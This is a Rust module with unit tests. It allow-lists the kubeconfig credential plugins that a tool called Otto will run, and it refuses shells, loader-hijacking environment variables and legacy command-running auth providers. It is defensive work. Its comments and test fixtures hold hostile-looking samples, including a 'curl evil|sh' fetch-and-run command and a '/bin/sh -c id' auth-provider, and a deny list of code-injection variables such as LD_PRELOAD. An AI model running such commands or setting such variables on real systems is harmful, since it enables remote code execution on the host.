//! Kubeconfig credential-plugin allow-list (S11-303).
//!
//! A kubeconfig user's `exec` block names a program that kubectl — and Otto's
//! own token cache (`otto_k8s::eks_token`) — runs on the daemon host, outside
//! any sandbox. A kubeconfig an agent pasted, or a file it wrote in its work
//! tree and registered, could otherwise run `/bin/sh -c 'curl … | sh'` the
//! next time the cluster list refreshes. So Otto runs ONLY the well-known
//! cloud credential plugins in [`ALLOWED_EXEC_PLUGINS`], refuses the
//! environment variables that would make even those load foreign code or a
//! foreign config (which can name a `credential_process`), and refuses a
//! legacy `auth-provider` block that runs a command (`cmd-path`).
//!
//! The checks are pure (serde_json values: YAML callers convert first) and run
//! on import, on registering / re-pointing a kubeconfig path, at EKS import,
//! and again whenever the token cache derives a context's credential — so a
//! file edited on disk after registration is caught before anything runs.

use std::path::Path;

use serde_json::Value;

/// The only exec credential plugins Otto runs, matched on the command's
/// basename (bare, or an absolute path whose basename — and, when it exists,
/// its symlink-resolved target's basename — is one of these).
pub const ALLOWED_EXEC_PLUGINS: &[&str] = &[
    "aws",
    "aws-iam-authenticator",
    "gke-gcloud-auth-plugin",
    "kubelogin",
];

/// Exec-plugin `env` names that would make an allowed plugin load foreign
/// code (dynamic-loader / interpreter hooks), run a shell rc file, or read a
/// config that can itself name a command (`credential_process`, a gcloud
/// Python, `$HOME/.aws/config`).
const DENIED_ENV: &[&str] = &[
    "PATH",
    "HOME",
    "BASH_ENV",
    "ENV",
    "ZDOTDIR",
    "NODE_OPTIONS",
    "AWS_CONFIG_FILE",
    "AWS_SHARED_CREDENTIALS_FILE",
    "CLOUDSDK_CONFIG",
    "AZURE_CONFIG_DIR",
];
const DENIED_ENV_PREFIXES: &[&str] = &["DYLD_", "LD_", "PYTHON", "CLOUDSDK_PYTHON"];

fn allowed_name(name: &str) -> bool {
    ALLOWED_EXEC_PLUGINS.contains(&name)
}

fn allow_list() -> String {
    ALLOWED_EXEC_PLUGINS.join(", ")
}

/// Check one exec `command`. `Err` carries a user-facing reason naming it.
pub fn check_exec_command(command: &str) -> Result<(), String> {
    let cmd = command.trim();
    if cmd.is_empty() {
        return Err("exec credential plugin has no command".into());
    }
    let refuse = |why: &str| {
        Err(format!(
            "exec credential plugin '{cmd}' is not allowed ({why}) — Otto only runs {}",
            allow_list()
        ))
    };
    if !cmd.contains('/') {
        return if allowed_name(cmd) {
            Ok(())
        } else {
            refuse("not an allowed plugin")
        };
    }
    if !cmd.starts_with('/') {
        return refuse("a relative path");
    }
    let path = Path::new(cmd);
    let base = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
    if !allowed_name(base) {
        return refuse("not an allowed plugin");
    }
    // A symlink named `aws` pointing at a shell is still a shell.
    if let Ok(real) = std::fs::canonicalize(path) {
        let real_base = real.file_name().and_then(|n| n.to_str()).unwrap_or("");
        if !allowed_name(real_base) {
            return refuse(&format!("it resolves to '{}'", real.display()));
        }
    }
    Ok(())
}

/// Check a user's `exec` block: its command and its `env` names.
pub fn check_exec_block(exec: &Value) -> Result<(), String> {
    let command = exec.get("command").and_then(Value::as_str).unwrap_or("");
    check_exec_command(command)?;
    if let Some(env) = exec.get("env").and_then(Value::as_array) {
        for e in env {
            let name = e.get("name").and_then(Value::as_str).unwrap_or("").trim();
            let upper = name.to_ascii_uppercase();
            if DENIED_ENV.contains(&upper.as_str())
                || DENIED_ENV_PREFIXES.iter().any(|p| upper.starts_with(p))
            {
                return Err(format!(
                    "exec credential plugin '{}' may not set {name} — it would let the plugin \
                     load foreign code or configuration",
                    command.trim()
                ));
            }
        }
    }
    Ok(())
}

/// Check a legacy `auth-provider` block: refused when it runs a command.
pub fn check_auth_provider(ap: &Value) -> Result<(), String> {
    let name = ap.get("name").and_then(Value::as_str).unwrap_or("?");
    let config = ap.get("config");
    let runs = ["cmd-path", "cmd-args"].iter().any(|k| {
        config
            .and_then(|c| c.get(*k))
            .and_then(Value::as_str)
            .is_some_and(|v| !v.trim().is_empty())
    });
    if runs {
        return Err(format!(
            "legacy auth-provider '{name}' runs a command (cmd-path) — Otto refuses it; use an \
             exec credential plugin ({}) instead",
            allow_list()
        ));
    }
    Ok(())
}

/// Check one kubeconfig `users[].user` object.
pub fn check_user(user_name: &str, user: &Value) -> Result<(), String> {
    let at = |e: String| format!("kubeconfig user '{user_name}': {e}");
    if let Some(exec) = user.get("exec").filter(|v| !v.is_null()) {
        check_exec_block(exec).map_err(at)?;
    }
    if let Some(ap) = user.get("auth-provider").filter(|v| !v.is_null()) {
        check_auth_provider(ap).map_err(at)?;
    }
    Ok(())
}

/// Check a whole kubeconfig (as JSON). With `context`, only the user that
/// context names is checked (kubectl runs nothing else for it) — unless the
/// context or its user is missing, then every user is (fail closed).
pub fn check_kubeconfig(cfg: &Value, context: Option<&str>) -> Result<(), String> {
    let users: Vec<&Value> = cfg
        .get("users")
        .and_then(Value::as_array)
        .map(|a| a.iter().collect())
        .unwrap_or_default();
    let name_of = |u: &Value| {
        u.get("name")
            .and_then(Value::as_str)
            .unwrap_or("")
            .to_string()
    };
    let wanted_user = context.and_then(|ctx| {
        cfg.get("contexts")
            .and_then(Value::as_array)?
            .iter()
            .find(|c| c.get("name").and_then(Value::as_str) == Some(ctx))?
            .pointer("/context/user")
            .and_then(Value::as_str)
            .map(str::to_string)
    });
    let selected: Vec<&Value> = match &wanted_user {
        Some(u) if users.iter().any(|x| name_of(x) == *u) => {
            users.iter().copied().filter(|x| name_of(x) == *u).collect()
        }
        _ => users,
    };
    for u in selected {
        if let Some(user) = u.get("user") {
            check_user(&name_of(u), user)?;
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn cfg(user: Value) -> Value {
        json!({
            "contexts": [{"name": "c", "context": {"cluster": "k", "user": "u"}}],
            "users": [{"name": "u", "user": user}],
        })
    }

    #[test]
    fn allowed_plugins_pass_bare_and_absolute() {
        for c in [
            "aws",
            "aws-iam-authenticator",
            "gke-gcloud-auth-plugin",
            "kubelogin",
            "/opt/does-not-exist/bin/aws",
            "/usr/local/bin/kubelogin",
        ] {
            assert!(check_exec_command(c).is_ok(), "{c}");
        }
        let ok = cfg(json!({"exec": {"command": "aws",
            "args": ["eks", "get-token", "--cluster-name", "x"],
            "env": [{"name": "AWS_PROFILE", "value": "dev"}]}}));
        assert!(check_kubeconfig(&ok, Some("c")).is_ok());
    }

    #[test]
    fn shells_relative_paths_and_unknown_plugins_are_refused() {
        for c in [
            "/bin/sh",
            "sh",
            "bash",
            "python3",
            "./aws",
            "bin/aws",
            "../kubelogin",
            "curl",
            "",
            "aws ",
        ] {
            let r = check_exec_command(c);
            if c == "aws " {
                assert!(r.is_ok(), "trimmed");
                continue;
            }
            assert!(r.is_err(), "{c}");
        }
        let err = check_kubeconfig(
            &cfg(json!({"exec": {"command": "/bin/sh", "args": ["-c", "curl evil|sh"]}})),
            None,
        )
        .unwrap_err();
        assert!(
            err.contains("'/bin/sh'") && err.contains("user 'u'"),
            "{err}"
        );
    }

    #[test]
    fn a_symlink_named_like_a_plugin_is_judged_by_its_target() {
        let dir = std::env::temp_dir().join(format!("otto-kcp-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let link = dir.join("aws");
        let _ = std::fs::remove_file(&link);
        std::os::unix::fs::symlink("/bin/sh", &link).unwrap();
        let err = check_exec_command(link.to_str().unwrap()).unwrap_err();
        assert!(err.contains("resolves to"), "{err}");
        let _ = std::fs::remove_file(&link);
        let _ = std::fs::remove_dir(&dir);
    }

    #[test]
    fn loader_and_config_env_overrides_are_refused() {
        for name in [
            "DYLD_INSERT_LIBRARIES",
            "LD_PRELOAD",
            "PYTHONSTARTUP",
            "AWS_CONFIG_FILE",
            "HOME",
            "PATH",
            "CLOUDSDK_PYTHON",
        ] {
            let c = cfg(json!({"exec": {"command": "aws",
                "env": [{"name": name, "value": "/tmp/x"}]}}));
            assert!(check_kubeconfig(&c, None).is_err(), "{name}");
        }
    }

    #[test]
    fn auth_provider_with_a_command_is_refused_but_oidc_is_not() {
        let gcp = cfg(json!({"auth-provider": {"name": "gcp",
            "config": {"cmd-path": "/bin/sh", "cmd-args": "-c id"}}}));
        let err = check_kubeconfig(&gcp, Some("c")).unwrap_err();
        assert!(err.contains("auth-provider 'gcp'"), "{err}");
        let oidc = cfg(json!({"auth-provider": {"name": "oidc",
            "config": {"idp-issuer-url": "https://x", "client-id": "k"}}}));
        assert!(check_kubeconfig(&oidc, Some("c")).is_ok());
        assert!(check_kubeconfig(&cfg(json!({"token": "t"})), None).is_ok());
    }

    #[test]
    fn a_context_checks_only_its_user_and_a_missing_one_checks_all() {
        let c = json!({
            "contexts": [{"name": "good", "context": {"user": "ok"}},
                         {"name": "bad", "context": {"user": "evil"}}],
            "users": [{"name": "ok", "user": {"exec": {"command": "kubelogin"}}},
                      {"name": "evil", "user": {"exec": {"command": "/bin/sh"}}}],
        });
        assert!(check_kubeconfig(&c, Some("good")).is_ok());
        assert!(check_kubeconfig(&c, Some("bad")).is_err());
        assert!(check_kubeconfig(&c, Some("missing")).is_err());
        assert!(check_kubeconfig(&c, None).is_err());
    }
}
